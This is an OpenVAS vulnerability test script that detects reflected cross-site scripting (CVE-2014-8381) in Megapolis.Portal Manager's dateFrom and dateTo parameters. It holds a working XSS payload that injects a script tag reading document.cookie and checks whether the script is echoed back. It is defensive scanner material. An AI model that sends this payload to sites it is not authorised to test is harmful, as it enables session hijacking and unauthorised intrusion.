###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_megapolis_portal_manager_xss_vuln.nasl 11402 2018-09-15 09:13:36Z cfischer $
#
# Megapolis.Portal Manager Multiple Cross Site Scripting Vulnerabilities
#
# Authors:
# Thanga Prakash S <tprakash@secpod.com>
#
# Copyright:
# Copyright (C) 2014 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.804784");
  script_version("$Revision: 11402 $");
  script_cve_id("CVE-2014-8381");
  script_bugtraq_id(70615);
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"$Date: 2018-09-15 11:13:36 +0200 (Sat, 15 Sep 2018) $");
  script_tag(name:"creation_date", value:"2014-10-28 12:24:56 +0530 (Tue, 28 Oct 2014)");
  script_name("Megapolis.Portal Manager Multiple Cross Site Scripting Vulnerabilities");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2014 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/97649");
  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/128725");
  script_xref(name:"URL", value:"http://seclists.org/fulldisclosure/2014/Oct/77");

  script_tag(name:"summary", value:"This host is installed with Megapolis.Portal
  Manager and is prone to multiple xss vulnerabilities.");

  script_tag(name:"vuldetect", value:"Send a crafted request via HTTP GET and
  check whether it is able to read cookie or not.");

  script_tag(name:"insight", value:"Flaw is due to /control/uk/publish/category
  script does not validate input to the 'dateFrom' and 'dateTo' parameters
  before returning it to users.");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker
  to execute arbitrary HTML and script code in the context of an affected site.");

  script_tag(name:"affected", value:"Megapolis.Portal Manager");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability.
Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

http_port = get_http_port(default:80);

foreach dir (make_list_unique("/", "/portal", "/manager", cgi_dirs(port:http_port)))
{

  if(dir == "/") dir = "";

  sndReq = http_get(item:string(dir, "/control/uk/publish/category"),  port:http_port);
  rcvRes = http_keepalive_send_recv(port:http_port, data:sndReq, bodyonly:TRUE);

  if("dateFrom" >< rcvRes && "dateTo" >< rcvRes &&
        "control/uk/publish/category" >< rcvRes)
  {
    url = dir + '/control/uk/publish/category?dateFrom=">'
              + '<script>alert(document.cookie)</script>';

    ## Extra Check is not possible
    if(http_vuln_check(port:http_port, url:url, check_header:TRUE,
       pattern:"<script>alert\(document.cookie\)</script>",
       extra_check:make_list("dateFrom", "dateTo")))
    {
      security_message(port:http_port);
      exit(0);
    }
  }
}

exit(99);
